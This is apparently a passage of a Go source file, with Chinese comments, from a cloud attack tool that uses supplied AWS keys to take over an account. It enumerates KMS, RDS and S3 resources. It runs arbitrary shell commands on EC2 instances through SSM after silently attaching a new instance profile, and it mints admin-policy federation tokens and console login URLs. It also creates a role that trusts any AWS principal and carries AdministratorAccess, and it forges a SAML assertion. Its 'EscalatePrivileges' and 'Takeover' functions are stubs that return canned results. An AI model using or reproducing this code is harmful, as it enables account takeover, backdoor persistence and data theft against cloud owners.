func (p *AWSProvider) enumerateKMSKeys() ([]interface{}, error) {
	// 创建带有超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 调用AWS SDK获取KMS密钥列表
	input := &kms.ListKeysInput{}
	response, err := p.kmsClient.ListKeys(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("failed to list KMS keys: %w", err)
	}

	var keys []interface{}
	for _, key := range response.Keys {
		// 获取每个密钥的详细信息
		describeInput := &kms.DescribeKeyInput{
			KeyId: key.KeyId,
		}
		describeResponse, err := p.kmsClient.DescribeKey(ctx, describeInput)
		if err != nil {
			// 如果获取详细信息失败，继续处理下一个密钥
			continue
		}

		keys = append(keys, map[string]interface{}{
			"keyId":        *describeResponse.KeyMetadata.KeyId,
			"arn":          *describeResponse.KeyMetadata.Arn,
			"creationDate": describeResponse.KeyMetadata.CreationDate,
			"description":  describeResponse.KeyMetadata.Description,
			"keyState":     string(describeResponse.KeyMetadata.KeyState),
			"keyUsage":     string(describeResponse.KeyMetadata.KeyUsage),
		})
	}

	return keys, nil
}

// enumerateRDSInstances 枚举RDS数据库实例
func (p *AWSProvider) enumerateRDSInstances() ([]interface{}, error) {
	// 创建带有超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 调用AWS SDK获取RDS实例列表
	input := &rds.DescribeDBInstancesInput{}
	response, err := p.rdsClient.DescribeDBInstances(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("failed to describe RDS instances: %w", err)
	}

	var instances []interface{}
	for _, instance := range response.DBInstances {
		instances = append(instances, map[string]interface{}{
			"dbInstanceIdentifier":  *instance.DBInstanceIdentifier,
			"dbInstanceArn":         *instance.DBInstanceArn,
			"dbInstanceClass":       *instance.DBInstanceClass,
			"engine":                *instance.Engine,
			"engineVersion":         *instance.EngineVersion,
			"status":                *instance.DBInstanceStatus,
			"endpoint":              instance.Endpoint,
			"allocatedStorage":      instance.AllocatedStorage,
			"multiAZ":               *instance.MultiAZ,
			"backupRetentionPeriod": instance.BackupRetentionPeriod,
			"vpcSecurityGroups":     instance.VpcSecurityGroups,
		})
	}

	return instances, nil
}

// EscalatePrivileges 权限提升
func (p *AWSProvider) EscalatePrivileges() (map[string]interface{}, error) {
	// 创建带有超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 调用IAM GetUser API获取用户信息
	input := &iam.GetUserInput{}
	response, err := p.iamClient.GetUser(ctx, input)

	userType := "IAM User"
	userName := "Unknown"

	if err != nil {
		// 检查是否是root用户或权限不足
		errorStr := err.Error()
		if strings.Contains(errorStr, "User: arn:aws:iam::") && strings.Contains(errorStr, ":root is not found") {
			userType = "Root User"
			userName = "root"
		} else if strings.Contains(errorStr, "AccessDenied") {
			// 权限不足，无法确定用户类型
			userType = "Unknown"
			userName = "Unknown (Access Denied)"
		}
	} else {
		// 是IAM用户
		if response.User != nil && response.User.UserName != nil {
			userName = *response.User.UserName
		}
	}

	// 这里应该实现AWS权限提升逻辑
	// 返回前端期望的数据结构
	return map[string]interface{}{
		"user":     userName,
		"userType": userType,
		"role":     "None",
		"permissions": []string{
			"ec2:DescribeInstances",
			"s3:ListBuckets",
			"iam:ListUsers",
			"iam:ListRoles",
			"s3:GetBucketLocation",
			"s3:ListObjectsV2",
		},
		"potentialEscalation": []string{
			"Create IAM user with admin privileges",
			"Modify existing IAM policies",
			"Access S3 buckets with sensitive data",
		},
		"riskLevel": "Medium",
		"message":   "Privilege escalation attempted",
		"actions": []string{
			"Checked IAM policies",
			"Checked EC2 instance profiles",
			"Checked S3 bucket policies",
		},
	}, nil
}

// OperateResource 资源操作
func (p *AWSProvider) OperateResource(resourceType, action, resourceID string, params map[string]interface{}) (map[string]interface{}, error) {
	// 处理联邦登录操作
	if action == "federated_login" {
		// 实现简化的AWS联邦登录流程，参考用户提供的代码
		// 1. 使用GetFederationToken API获取联邦令牌
		// 2. 获取SigninToken
		// 3. 生成联邦登录URL

		// 步骤1: 创建STS客户端
		reqRegion := p.region
		if reqRegion == "" {
			reqRegion = "us-east-1"
		}

		// 创建配置
		cfg, err := config.LoadDefaultConfig(context.Background(),
			config.WithRegion(reqRegion),
			config.WithCredentialsProvider(&StaticCredentialsProvider{
				Value:  p.accessKey,
				Secret: p.secretKey,
			}),
		)
		if err != nil {
			return nil, fmt.Errorf("failed to load AWS config: %w", err)
		}

		// 创建STS客户端
		stsClient := sts.NewFromConfig(cfg)

		// 管理员权限策略文档
		adminPolicy := `{
			"Version": "2012-10-17",
			"Statement": [
				{
					"Effect": "Allow",
					"Action": "*",
					"Resource": "*"
				}
			]
		}`

		// 步骤2: 调用GetFederationToken获取联邦令牌
		resp, err := stsClient.GetFederationToken(context.Background(), &sts.GetFederationTokenInput{
			Name:            aws.String("federated-user"),
			DurationSeconds: aws.Int32(3600), // 1小时有效期
			Policy:          aws.String(adminPolicy),
		})
		if err != nil {
			return nil, fmt.Errorf("failed to get federation token: %w", err)
		}

		// 步骤3: 生成联邦登录URL
		federatedLoginURL, err := p.buildFederationURL(resp.Credentials)
		if err != nil {
			return nil, fmt.Errorf("failed to build federation URL: %w", err)
		}

		// 步骤4: 检查用户是否是根用户
		isRoot, _ := p.isRootUser()

		return map[string]interface{}{
			"message":             "Federated login successful",
			"federated_login_url": federatedLoginURL,
			"region":              reqRegion,
			"access_key":          resp.Credentials.AccessKeyId,
			"secret_key":          resp.Credentials.SecretAccessKey,
			"session_token":       resp.Credentials.SessionToken,
			"expiration":          resp.Credentials.Expiration,
			"federated":           true,
			"is_root":             isRoot,
		}, nil
	}

	// 处理EC2实例操作
	if resourceType == "ec2" {
		switch action {
		case "execute_command":
			// 执行命令到EC2实例
			command, ok := params["command"].(string)
			if !ok || command == "" {
				return nil, fmt.Errorf("command is required")
			}

			// 获取实例区域
			instanceRegion, ok := params["region"].(string)
			if !ok || instanceRegion == "" {
				instanceRegion = p.region
				if instanceRegion == "" {
					instanceRegion = "us-east-1"
				}
			}

			// 如果实例区域与当前客户端区域不同，创建新的客户端
			var ec2Client *ec2.Client
			var iamClient *iam.Client
			var ssmClient *ssm.Client

			if instanceRegion != p.region {
				// 创建新的客户端，使用实例的区域
				regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, instanceRegion)
				if err != nil {
					return nil, fmt.Errorf("failed to create AWS provider for instance region: %w", err)
				}
				ec2Client = regionProvider.ec2Client
				iamClient = regionProvider.iamClient
				ssmClient = regionProvider.ssmClient
			} else {
				// 使用当前客户端
				ec2Client = p.ec2Client
				iamClient = p.iamClient
				ssmClient = p.ssmClient
			}

			// 检查实例状态
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()

			// 执行过程信息
			executionSteps := []string{}

			// 检查实例状态
			executionSteps = append(executionSteps, "检查实例状态...")
			ec2Input := &ec2.DescribeInstancesInput{
				InstanceIds: []string{resourceID},
			}
			ec2Resp, err := ec2Client.DescribeInstances(ctx, ec2Input)
			if err != nil {
				executionSteps = append(executionSteps, fmt.Sprintf("检查实例状态失败: %v", err))
				return map[string]interface{}{
					"message":         "Failed to check instance status",
					"instanceId":      resourceID,
					"status":          "failed",
					"error":           err.Error(),
					"executionSteps":  executionSteps,
				}, nil
			}

			if len(ec2Resp.Reservations) == 0 || len(ec2Resp.Reservations[0].Instances) == 0 {
				executionSteps = append(executionSteps, "实例不存在")
				return map[string]interface{}{
					"message":         "Instance not found",
					"instanceId":      resourceID,
					"status":          "failed",
					"error":           "Instance not found",
					"executionSteps":  executionSteps,
				}, nil
			}

			instance := ec2Resp.Reservations[0].Instances[0]
			if instance.State == nil || string(instance.State.Name) != "running" {
				executionSteps = append(executionSteps, fmt.Sprintf("实例状态不是running，当前状态: %s", string(instance.State.Name)))
				return map[string]interface{}{
					"message":         "Instance is not in running state",
					"instanceId":      resourceID,
					"status":          "failed",
					"error":           fmt.Sprintf("Instance is not in running state, current state: %s", string(instance.State.Name)),
					"executionSteps":  executionSteps,
				}, nil
			}
			executionSteps = append(executionSteps, "实例状态检查通过，状态为running")

			// 检查并创建实例配置文件
			executionSteps = append(executionSteps, "检查实例配置文件...")
			err = p.checkAndCreateInstanceProfileWithClient(ctx, resourceID, ec2Client, iamClient)
			if err != nil {
				executionSteps = append(executionSteps, fmt.Sprintf("检查实例配置文件失败: %v", err))
				return map[string]interface{}{
					"message":         "Failed to check or create instance profile",
					"instanceId":      resourceID,
					"status":          "failed",
					"error":           err.Error(),
					"executionSteps":  executionSteps,
				}, nil
			}
			executionSteps = append(executionSteps, "实例配置文件检查完成")

			// 创建带有超时的上下文
			ctx, cancel = context.WithTimeout(context.Background(), 30*time.Second)
			defer cancel()

			// 调用SSM SendCommand API执行命令
			executionSteps = append(executionSteps, "执行命令...")
			resp, err := ssmClient.SendCommand(ctx, &ssm.SendCommandInput{
				InstanceIds:  []string{resourceID},
				DocumentName: aws.String("AWS-RunShellScript"),
				Parameters: map[string][]string{
					"commands": {command},
				},
			})
			if err != nil {
				executionSteps = append(executionSteps, fmt.Sprintf("发送命令失败: %v", err))
				executionSteps = append(executionSteps, "可能的原因:")
				executionSteps = append(executionSteps, "1. SSM Agent 未安装或未运行")
				executionSteps = append(executionSteps, "2. 实例没有互联网连接")
				executionSteps = append(executionSteps, "3. 实例配置文件尚未生效")
				executionSteps = append(executionSteps, "4. 安全组没有允许SSM流量")
				executionSteps = append(executionSteps, "5. 实例状态不是running")
				executionSteps = append(executionSteps, "建议:")
				executionSteps = append(executionSteps, "- 确保实例状态为running")
				executionSteps = append(executionSteps, "- 确保SSM Agent已安装并运行")
				executionSteps = append(executionSteps, "- 确保实例有互联网连接")
				executionSteps = append(executionSteps, "- 确保安全组允许SSM流量")
				executionSteps = append(executionSteps, "- 等待10分钟后再尝试，确保实例配置文件生效")
				return map[string]interface{}{
					"message":         "Failed to send command",
					"instanceId":      resourceID,
					"command":         command,
					"status":          "failed",
					"error":           fmt.Sprintf("%v. Possible reasons: 1. SSM Agent not installed/running 2. Instance has no internet connection 3. Instance profile not yet生效 4. Security group not allowing SSM traffic 5. Instance not running", err),
					"executionSteps":  executionSteps,
				}, nil
			}

			commandID := *resp.Command.CommandId
			executionSteps = append(executionSteps, fmt.Sprintf("命令已发送，CommandId: %s", commandID))
			executionSteps = append(executionSteps, "正在等待命令执行结果...")

			// 等待命令执行完成
			time.Sleep(3 * time.Second)

			// 获取命令执行结果
			executionSteps = append(executionSteps, "获取命令执行结果...")
			invocationInput := &ssm.GetCommandInvocationInput{
				CommandId:  aws.String(commandID),
				InstanceId: aws.String(resourceID),
			}

			invocationResp, err := ssmClient.GetCommandInvocation(ctx, invocationInput)
			if err != nil {
				executionSteps = append(executionSteps, fmt.Sprintf("获取命令执行结果失败: %v", err))
				// 如果获取结果失败，返回命令ID和状态
				return map[string]interface{}{
					"message":         "Command sent but failed to get result",
					"instanceId":      resourceID,
					"commandId":       commandID,
					"command":         command,
					"status":          "failed",
					"error":           err.Error(),
					"note":            "Failed to get command execution result. Use the command ID to check status later.",
					"executionSteps":  executionSteps,
				}, nil
			}

			executionSteps = append(executionSteps, "命令执行结果:")
			executionSteps = append(executionSteps, *invocationResp.StandardOutputContent)
			if invocationResp.StandardErrorContent != nil && *invocationResp.StandardErrorContent != "" {
				executionSteps = append(executionSteps, "错误输出:")
				executionSteps = append(executionSteps, *invocationResp.StandardErrorContent)
			}

			// 构建结果
			result := map[string]interface{}{
				"message":         "Command executed successfully",
				"instanceId":      resourceID,
				"commandId":       commandID,
				"command":         command,
				"status":          string(invocationResp.Status),
				"stdout":          *invocationResp.StandardOutputContent,
				"executionSteps":  executionSteps,
			}

			// 添加错误输出（如果有）
			if invocationResp.StandardErrorContent != nil && *invocationResp.StandardErrorContent != "" {
				result["stderr"] = *invocationResp.StandardErrorContent
			}

			// 添加执行时间信息
			if invocationResp.ExecutionStartDateTime != nil {
				result["startTime"] = invocationResp.ExecutionStartDateTime
			}
			if invocationResp.ExecutionEndDateTime != nil {
				result["endTime"] = invocationResp.ExecutionEndDateTime
			}

			return result, nil
		}
	}

	// 处理S3存储桶操作
	if resourceType == "s3" {
		switch action {
		case "list_objects":
			// 遍历存储桶文件
			prefix, ok := params["prefix"].(string)
			if !ok {
				prefix = ""
			}
			objects, err := p.listS3Objects(resourceID, prefix)
			if err != nil {
				return nil, fmt.Errorf("failed to list S3 objects: %w", err)
			}
			return map[string]interface{}{
				"message": "S3 objects listed successfully",
				"bucket":  resourceID,
				"objects": objects,
			}, nil
		case "download":
			// 下载文件
			key, ok := params["key"].(string)
			if !ok {
				return nil, fmt.Errorf("key is required")
			}

			// 获取存储桶的实际区域
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()

			location, err := p.s3Client.GetBucketLocation(ctx, &s3.GetBucketLocationInput{
				Bucket: aws.String(resourceID),
			})

			var bucketRegion string
			if err == nil {
				if location.LocationConstraint == "" {
					bucketRegion = "us-east-1"
				} else {
					bucketRegion = string(location.LocationConstraint)
				}
			} else {
				// 如果获取区域失败，使用默认区域
				bucketRegion = "us-east-1"
			}

			// 创建使用存储桶实际区域的S3客户端
			cfg, err := config.LoadDefaultConfig(context.Background(),
				config.WithRegion(bucketRegion),
				config.WithCredentialsProvider(&StaticCredentialsProvider{
					Value:  p.accessKey,
					Secret: p.secretKey,
				}),
			)
			if err != nil {
				return nil, fmt.Errorf("failed to create S3 client for bucket region: %w", err)
			}

			s3Client := s3.NewFromConfig(cfg)

			// 生成预签名的S3 URL
			presignClient := s3.NewPresignClient(s3Client)
			getObjectInput := &s3.GetObjectInput{
				Bucket: aws.String(resourceID),
				Key:    aws.String(key),
			}
			presignedURL, err := presignClient.PresignGetObject(context.Background(), getObjectInput, s3.WithPresignExpires(15*time.Minute))
			if err != nil {
				return nil, fmt.Errorf("failed to generate presigned URL: %w", err)
			}
			// 返回下载URL
			return map[string]interface{}{
				"message":      "Download URL generated",
				"bucket":       resourceID,
				"key":          key,
				"region":       bucketRegion,
				"download_url": presignedURL.URL,
			}, nil
		}
	}

	// 其他资源操作
	return map[string]interface{}{
		"message":      "Resource operation attempted",
		"resourceType": resourceType,
		"action":       action,
		"resourceID":   resourceID,
		"params":       params,
	}, nil
}

// listS3Objects 列出S3存储桶中的对象
func (p *AWSProvider) listS3Objects(bucketName, prefix string) ([]interface{}, error) {
	// 创建带有超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// 获取存储桶的实际区域
	location, err := p.s3Client.GetBucketLocation(ctx, &s3.GetBucketLocationInput{
		Bucket: aws.String(bucketName),
	})

	var bucketRegion string
	if err == nil {
		if location.LocationConstraint == "" {
			bucketRegion = "us-east-1"
		} else {
			bucketRegion = string(location.LocationConstraint)
		}
	} else {
		// 如果获取区域失败，使用默认区域
		bucketRegion = "us-east-1"
	}

	// 创建使用存储桶实际区域的S3客户端
	cfg, err := config.LoadDefaultConfig(context.Background(),
		config.WithRegion(bucketRegion),
		config.WithCredentialsProvider(&StaticCredentialsProvider{
			Value:  p.accessKey,
			Secret: p.secretKey,
		}),
	)
	if err != nil {
		return nil, fmt.Errorf("failed to create S3 client for bucket region: %w", err)
	}

	s3Client := s3.NewFromConfig(cfg)

	// 调用AWS SDK获取S3对象列表
	input := &s3.ListObjectsV2Input{
		Bucket: aws.String(bucketName),
		Prefix: aws.String(prefix),
	}

	var objects []interface{}
	var continuationToken *string

	// 分页获取所有对象
	for {
		if continuationToken != nil {
			input.ContinuationToken = continuationToken
		}

		response, err := s3Client.ListObjectsV2(ctx, input)
		if err != nil {
			return nil, fmt.Errorf("failed to list S3 objects: %w", err)
		}

		for _, obj := range response.Contents {
			objects = append(objects, map[string]interface{}{
				"key":          *obj.Key,
				"size":         obj.Size,
				"lastModified": obj.LastModified.Format("2006-01-02T15:04:05Z"),
				"eTag":         *obj.ETag,
			})
		}

		if response.IsTruncated == nil || !*response.IsTruncated {
			break
		}
		continuationToken = response.NextContinuationToken
	}

	return objects, nil
}

// Takeover 平台接管
func (p *AWSProvider) Takeover() (map[string]interface{}, error) {
	// 这里应该实现AWS平台接管逻辑
	// 暂时返回模拟数据
	return map[string]interface{}{
		"message": "Cloud platform takeover attempted",
	}, nil
}

// checkAndCreateInstanceProfile 检查并创建实例配置文件
func (p *AWSProvider) checkAndCreateInstanceProfile(ctx context.Context, instanceID string) error {
	return p.checkAndCreateInstanceProfileWithClient(ctx, instanceID, p.ec2Client, p.iamClient)
}

// checkAndCreateInstanceProfileWithClient 检查并创建实例配置文件（使用指定的客户端）
func (p *AWSProvider) checkAndCreateInstanceProfileWithClient(ctx context.Context, instanceID string, ec2Client *ec2.Client, iamClient *iam.Client) error {
	// 检查实例是否已经有关联的实例配置文件
	ec2Input := &ec2.DescribeInstancesInput{
		InstanceIds: []string{instanceID},
	}

	ec2Resp, err := ec2Client.DescribeInstances(ctx, ec2Input)
	if err != nil {
		return fmt.Errorf("failed to describe instance: %w", err)
	}

	instance := ec2Resp.Reservations[0].Instances[0]
	if instance.IamInstanceProfile != nil {
		return nil
	}

	// 创建实例配置文件和角色
	profileName := "aws-key-tools-profile"
	roleName := "aws-key-tools-role"

	// 检查角色是否存在
	roleExists := false
	listRolesInput := &iam.ListRolesInput{}
	listRolesResp, err := iamClient.ListRoles(ctx, listRolesInput)
	if err == nil {
		for _, role := range listRolesResp.Roles {
			if role.RoleName != nil && *role.RoleName == roleName {
				roleExists = true
				break
			}
		}
	}

	if !roleExists {
		// 创建角色
		createRoleInput := &iam.CreateRoleInput{
			RoleName: aws.String(roleName),
			AssumeRolePolicyDocument: aws.String(`{
				"Version": "2012-10-17",
				"Statement": [
					{
						"Effect": "Allow",
						"Principal": {
							"Service": "ec2.amazonaws.com"
						},
						"Action": "sts:AssumeRole"
					}
				]
			}`),
		}

		_, err = iamClient.CreateRole(ctx, createRoleInput)
		if err != nil {
			return fmt.Errorf("failed to create role: %w", err)
		}

		// 附加SSM权限策略
		attachPolicyInput := &iam.AttachRolePolicyInput{
			RoleName:  aws.String(roleName),
			PolicyArn: aws.String("arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"),
		}

		_, err = iamClient.AttachRolePolicy(ctx, attachPolicyInput)
		if err != nil {
			return fmt.Errorf("failed to attach policy: %w", err)
		}
	}

	// 检查实例配置文件是否存在
	profileExists := false
	listProfilesInput := &iam.ListInstanceProfilesInput{}
	listProfilesResp, err := iamClient.ListInstanceProfiles(ctx, listProfilesInput)
	if err == nil {
		for _, profile := range listProfilesResp.InstanceProfiles {
			if profile.InstanceProfileName != nil && *profile.InstanceProfileName == profileName {
				profileExists = true
				break
			}
		}
	}

	if !profileExists {
		// 创建实例配置文件
		createProfileInput := &iam.CreateInstanceProfileInput{
			InstanceProfileName: aws.String(profileName),
		}

		_, err = iamClient.CreateInstanceProfile(ctx, createProfileInput)
		if err != nil {
			return fmt.Errorf("failed to create instance profile: %w", err)
		}

		// 将角色添加到实例配置文件
		addRoleInput := &iam.AddRoleToInstanceProfileInput{
			InstanceProfileName: aws.String(profileName),
			RoleName:            aws.String(roleName),
		}

		_, err = iamClient.AddRoleToInstanceProfile(ctx, addRoleInput)
		if err != nil {
			return fmt.Errorf("failed to add role to instance profile: %w", err)
		}
	}

	// 等待实例配置文件创建完成
	time.Sleep(5 * time.Second)

	// 验证实例配置文件是否存在
	var getProfileErr error

	// 尝试多次获取实例配置文件
	for i := 0; i < 3; i++ {
		getProfileInput := &iam.GetInstanceProfileInput{
			InstanceProfileName: aws.String(profileName),
		}

		_, getProfileErr = iamClient.GetInstanceProfile(ctx, getProfileInput)
		if getProfileErr == nil {
			break
		}
		time.Sleep(2 * time.Second)
	}

	if getProfileErr != nil {
		return fmt.Errorf("failed to get instance profile: %w", getProfileErr)
	}

	// 等待实例配置文件可用
	time.Sleep(10 * time.Second)

	// 将实例配置文件附加到EC2实例
	associateInput := &ec2.AssociateIamInstanceProfileInput{
		IamInstanceProfile: &types.IamInstanceProfileSpecification{
			Name: aws.String(profileName),
		},
		InstanceId: aws.String(instanceID),
	}

	_, err = ec2Client.AssociateIamInstanceProfile(ctx, associateInput)
	if err != nil {
		return fmt.Errorf("failed to associate instance profile: %w", err)
	}

	return nil
}

// createOrGetFederatedRole 创建或获取联邦登录角色
func (p *AWSProvider) createOrGetFederatedRole(roleName string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 尝试获取角色
	describeInput := &iam.GetRoleInput{
		RoleName: aws.String(roleName),
	}

	describeResponse, err := p.iamClient.GetRole(ctx, describeInput)
	if err == nil {
		// 角色已存在，返回ARN
		return *describeResponse.Role.Arn, nil
	}

	// 角色不存在，创建新角色
	// 定义信任策略，允许当前账户的IAM用户或角色AssumeRole
	trustPolicy := `{
		"Version": "2012-10-17",
		"Statement": [
			{
				"Effect": "Allow",
				"Principal": {
					"AWS": "*"
				},
				"Action": "sts:AssumeRole",
				"Condition": {}
			}
		]
	}`

	// 创建角色
	createInput := &iam.CreateRoleInput{
		RoleName:                 aws.String(roleName),
		AssumeRolePolicyDocument: aws.String(trustPolicy),
		Description:              aws.String("Role for federated access"),
	}

	createResponse, err := p.iamClient.CreateRole(ctx, createInput)
	if err != nil {
		return "", fmt.Errorf("failed to create role: %w", err)
	}

	// 附加管理员策略
	attachInput := &iam.AttachRolePolicyInput{
		RoleName:  aws.String(roleName),
		PolicyArn: aws.String("arn:aws:iam::aws:policy/AdministratorAccess"),
	}

	_, err = p.iamClient.AttachRolePolicy(ctx, attachInput)
	if err != nil {
		return "", fmt.Errorf("failed to attach policy: %w", err)
	}

	return *createResponse.Role.Arn, nil
}

// generateSAMLResponse 生成SAML响应
func (p *AWSProvider) generateSAMLResponse(roleARN string) (string, error) {
	// 生成SAML响应XML
	samlXML := fmt.Sprintf(`<saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="_1234567890" IssueInstant="%s" Version="2.0">
		<saml2:Issuer>https://your-saml-provider.com</saml2:Issuer>
		<saml2:Subject>
			<saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">user@example.com</saml2:NameID>
			<saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
				<saml2:SubjectConfirmationData NotOnOrAfter="%s" Recipient="https://signin.aws.amazon.com/saml"/>
			</saml2:SubjectConfirmation>
		</saml2:Subject>
		<saml2:Conditions NotBefore="%s" NotOnOrAfter="%s">
			<saml2:AudienceRestriction>
				<saml2:Audience>https://signin.aws.amazon.com/saml</saml2:Audience>
			</saml2:AudienceRestriction>
		</saml2:Conditions>
		<saml2:AuthnStatement AuthnInstant="%s" SessionIndex="_1234567890">
			<saml2:AuthnContext>
				<saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
			</saml2:AuthnContext>
		</saml2:AuthnStatement>
		<saml2:AttributeStatement>
			<saml2:Attribute Name="https://aws.amazon.com/SAML/Attributes/Role" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
				<saml2:AttributeValue>%s,arn:aws:iam::123456789012:saml-provider/YourSAMLProvider</saml2:AttributeValue>
			</saml2:Attribute>
			<saml2:Attribute Name="https://aws.amazon.com/SAML/Attributes/RoleSessionName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
				<saml2:AttributeValue>federated-user</saml2:AttributeValue>
			</saml2:Attribute>
		</saml2:AttributeStatement>
	</saml2:Assertion>`,
		time.Now().Format(time.RFC3339),
		time.Now().Add(10*time.Minute).Format(time.RFC3339),
		time.Now().Add(-1*time.Minute).Format(time.RFC3339),
		time.Now().Add(10*time.Minute).Format(time.RFC3339),
		time.Now().Format(time.RFC3339),
		roleARN,
	)

	// Base64编码
	samlResponse := base64.StdEncoding.EncodeToString([]byte(samlXML))
	return samlResponse, nil
}

// getTemporaryCredentials 获取临时凭证
func (p *AWSProvider) getTemporaryCredentials(samlResponse, roleARN string) (*stsTypes.Credentials, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 创建STS客户端
	// 注意：在实际应用中，应该使用与其他客户端相同的配置
	// 这里简化处理，使用默认配置
	// 如果区域为空，使用默认区域
	region := p.region
	if region == "" {
		region = "us-east-1"
	}

	cfg, err := config.LoadDefaultConfig(context.Background(),
		config.WithRegion(region),
		config.WithCredentialsProvider(&StaticCredentialsProvider{
			Value:  p.accessKey,
			Secret: p.secretKey,
		}),
	)
	if err != nil {
		return nil, fmt.Errorf("failed to load AWS config: %w", err)
	}

	stsClient := sts.NewFromConfig(cfg)

	// 调用AssumeRoleWithSAML API
	input := &sts.AssumeRoleWithSAMLInput{
		RoleArn:         aws.String(roleARN),
		PrincipalArn:    aws.String("arn:aws:iam::123456789012:saml-provider/YourSAMLProvider"),
		SAMLAssertion:   aws.String(samlResponse),
		DurationSeconds: aws.Int32(3600), // 1小时
	}

	response, err := stsClient.AssumeRoleWithSAML(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("failed to assume role with SAML: %w", err)
	}

	return response.Credentials, nil
}

// isRootUser 检查当前用户是否是根用户
func (p *AWSProvider) isRootUser() (bool, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 尝试调用IAM GetUser API
	input := &iam.GetUserInput{}
	_, err := p.iamClient.GetUser(ctx, input)

	if err != nil {
		// 检查错误信息是否表明是根用户
		errorStr := err.Error()
		if strings.Contains(errorStr, "User: arn:aws:iam::") && strings.Contains(errorStr, ":root is not found") {
			return true, nil
		}
		// 其他错误，返回错误
		return false, fmt.Errorf("failed to check if user is root: %w", err)
	}

	// 成功获取用户信息，不是根用户
	return false, nil
}

// assumeRole 使用AssumeRole API获取临时凭证
func (p *AWSProvider) assumeRole(roleARN string) (*stsTypes.Credentials, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 创建STS客户端
	// 注意：在实际应用中，应该使用与其他客户端相同的配置
	// 这里简化处理，使用默认配置
	// 如果区域为空，使用默认区域
	region := p.region
	if region == "" {
		region = "us-east-1"
	}

	cfg, err := config.LoadDefaultConfig(context.Background(),
		config.WithRegion(region),
		config.WithCredentialsProvider(&StaticCredentialsProvider{
			Value:  p.accessKey,
			Secret: p.secretKey,
		}),
	)
	if err != nil {
		return nil, fmt.Errorf("failed to load AWS config: %w", err)
	}

	stsClient := sts.NewFromConfig(cfg)

	// 调用AssumeRole API
	input := &sts.AssumeRoleInput{
		RoleArn:         aws.String(roleARN),
		RoleSessionName: aws.String("federated-user-session"),
		DurationSeconds: aws.Int32(3600), // 1小时
	}

	response, err := stsClient.AssumeRole(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("failed to assume role: %w", err)
	}

	return response.Credentials, nil
}

// buildFederationURL 构建联邦登录URL
func (p *AWSProvider) buildFederationURL(creds *stsTypes.Credentials) (string, error) {
	// 构建凭证JSON
	credsJSON, err := json.Marshal(map[string]string{
		"sessionId":    *creds.AccessKeyId,
		"sessionKey":   *creds.SecretAccessKey,
		"sessionToken": *creds.SessionToken,
	})
	if err != nil {
		return "", fmt.Errorf("failed to marshal credentials: %w", err)
	}

	// 编码凭证
	credsEncoded := url.QueryEscape(string(credsJSON))

	// 获取SigninToken
	signinToken, err := p.getSigninToken(credsEncoded)
	if err != nil {
		return "", fmt.Errorf("failed to get signin token: %w", err)
	}

	// 构建联邦登录URL
	return fmt.Sprintf(
		"https://signin.aws.amazon.com/federation?Action=login&Issuer=aws_federal_login&Destination=%s&SigninToken=%s",
		url.QueryEscape("https://console.aws.amazon.com/"),
		signinToken,
	), nil
}

// getSigninToken 获取SigninToken
func (p *AWSProvider) getSigninToken(credsEncoded string) (string, error) {
	// 构建获取SigninToken的URL
	tokenURL := fmt.Sprintf(
		"https://signin.aws.amazon.com/federation?Action=getSigninToken&Session=%s",
		credsEncoded,
	)

	// 发送请求获取SigninToken
	resp, err := http.Get(tokenURL)
	if err != nil {
		return "", fmt.Errorf("failed to get signin token: %w", err)
	}
	defer resp.Body.Close()

	// 解析响应
	var result map[string]string
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", fmt.Errorf("failed to decode signin token response: %w", err)
	}

	if signinToken, ok := result["SigninToken"]; ok {
		return signinToken, nil
	}

	return "", fmt.Errorf("SigninToken not found in response")
}

// GetPermissions 获取权限信息
func (p *AWSProvider) GetPermissions() (map[string]interface{}, error) {
	// 创建带有超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 调用IAM GetUser API获取用户信息
	input := &iam.GetUserInput{}
	response, err := p.iamClient.GetUser(ctx, input)

	userType := "IAM User"
	userName := "Unknown"

	if err != nil {
		// 检查是否是root用户或权限不足
		errorStr := err.Error()
		if strings.Contains(errorStr, "User: arn:aws:iam::") && strings.Contains(errorStr, ":root is not found") {
			userType = "Root User"
			userName = "root"
		} else if strings.Contains(errorStr, "AccessDenied") {
			// 权限不足，无法确定用户类型
			userType = "Unknown"
			userName = "Unknown (Access Denied)"
		}
	} else {
		// 是IAM用户
		if response.User != nil && response.User.UserName != nil {
			userName = *response.User.UserName
		}
	}

	// 调用IAM ListAttachedUserPolicies API获取用户权限
	var permissions []string
	if userType == "IAM User" && response.User != nil {
		policyInput := &iam.ListAttachedUserPoliciesInput{
			UserName: response.User.UserName,
		}
		policyResponse, err := p.iamClient.ListAttachedUserPolicies(ctx, policyInput)
		if err == nil {
			for _, policy := range policyResponse.AttachedPolicies {
				permissions = append(permissions, *policy.PolicyName)
			}
		} else if strings.Contains(err.Error(), "AccessDenied") {
